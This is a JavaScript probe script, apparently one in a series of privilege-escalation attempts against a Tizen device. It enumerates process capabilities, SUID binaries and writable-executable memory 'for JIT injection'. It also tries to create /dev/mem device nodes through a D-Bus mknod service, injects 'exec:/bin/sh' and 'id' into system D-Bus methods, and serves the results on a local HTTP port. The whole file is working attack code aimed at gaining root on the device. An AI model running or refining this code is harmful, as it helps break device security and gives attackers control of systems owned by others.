// v38 - check process capabilities, try /dev/ paths for ps_mknod, more SUID probing
// Pull server: 8121
try {
  var cp = require('child_process');
  var http = require('http');
  var fs = require('fs');
  var res = {};
  var total = 0, done_count = 0;

  function finish(key, val) {
    res[key] = String(val).substring(0, 1000);
    done_count++;
    if (done_count >= total) flush();
  }
  function flush() {
    var body = Object.keys(res).map(function(k){ return '[' + k + ']: ' + res[k]; }).join('\n') + '\n=== LIVE ===\n';
    try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe38.txt', body); } catch(e) {}
    var srv = http.createServer(function(req, resp) {
      resp.writeHead(200, {'Content-Type': 'text/plain'});
      resp.end(body);
    });
    srv.listen(8121, '127.0.0.1', function(){});
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }

  function run(key, cmd) {
    total++;
    cp.exec(cmd + ' 2>&1', {timeout:8000}, function(err,out){
      finish(key, out||String(err));
    });
  }

  function dbus(key, dest, path, method, args) {
    total++;
    var cmd = 'dbus-send --system --print-reply --dest=' + dest + ' "' + path + '" ' + method + (args ? ' ' + args : '') + ' 2>&1';
    cp.exec(cmd, {timeout: 10000}, function(err, out) {
      finish(key, out || String(err));
    });
  }

  var MKDEST='com.safe.ps_mknod', MKPATH='/com/safe/ps_mknod', CC='com.safe.ps_mknod.CallCommand';

  // 1. Process capabilities
  run('caps', "grep -E 'Cap(Eff|Prm|Bnd|Inh)' /proc/self/status");
  // CapEff: each bit = one capability. Key bits:
  // bit 1 = DAC_OVERRIDE, bit 6 = SETUID, bit 19 = SYS_PTRACE, bit 21 = SYS_ADMIN

  // 2. Try ps_mknod with /dev/ paths
  dbus('mk_dev_mem', MKDEST, MKPATH, CC, 'string:"/dev/mem38" int32:8576 int32:1 int32:1');
  dbus('mk_dev_null', MKDEST, MKPATH, CC, 'string:"/dev/null38" int32:8630 int32:1 int32:3');
  // Try just device name without path
  dbus('mk_name_mem', MKDEST, MKPATH, CC, 'string:"mem38" int32:8576 int32:1 int32:1');

  // 3. Check if files were created after a delay
  setTimeout(function() {
    run('dev_created', 'ls -laZ /dev/mem38 /dev/null38 /tmp/mem38 2>&1 || echo none');
  }, 11000);

  // 4. /proc/self/maps key areas (for JIT injection)
  run('maps_rwx', "grep rwxp /proc/self/maps | head -6");
  run('maps_node', "grep node /proc/self/maps | head -4");
  run('maps_libc', "grep 'libc\\|libdl\\|ld-linux' /proc/self/maps | head -4");

  // 5. All SUID binaries we haven't fully explored
  run('suid_all', "find / -maxdepth 5 -perm -4000 -type f 2>/dev/null | grep -v proc");

  // 6. RunningAppsService with more args
  run('ras_id',  '/usr/bin/RunningAppsService -e "id" 2>&1 | head -3');
  run('ras_ver', '/usr/bin/RunningAppsService --version 2>&1 | head -3');
  run('ras_str', 'strings /usr/bin/RunningAppsService 2>/dev/null | grep -E "^-[a-z]|exec|cmd|run|%s" | head -20');

  // 7. Check /proc/self/status for uid/gid/groups and seccomp
  run('status', 'grep -E "Name|Pid|Uid|Gid|Groups|Seccomp|NoNewPrivs|CapEff|CapPrm|CapBnd" /proc/self/status');

  // 8. Check if we can open /proc/kcore or /dev/mem directly
  run('kcore',  'ls -la /proc/kcore /dev/mem /dev/kmem 2>&1');

  // 9. Check /proc/net/unix for accessible privileged sockets
  run('unix_priv', "cat /proc/net/unix | awk '{print $8}' | grep -E 'smack|root|priv|system|daemon' | head -20");

  // 10. SysNoti/kernel with interesting args (maybe triggers exec?)
  dbus('deviced_sysn_exec', 'org.tizen.system.deviced',
    '/Org/Tizen/System/DeviceD/SysNoti',
    'org.tizen.system.deviced.SysNoti.kernel',
    'string:"tizen" int32:1 string:"exec:/bin/sh"');
  dbus('deviced_sysn_id', 'org.tizen.system.deviced',
    '/Org/Tizen/System/DeviceD/SysNoti',
    'org.tizen.system.deviced.SysNoti.kernel',
    'string:"security" int32:0 string:"id"');

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe38-crash.txt', String(e.stack||e.message).substring(0,500)); } catch(e2){}
}
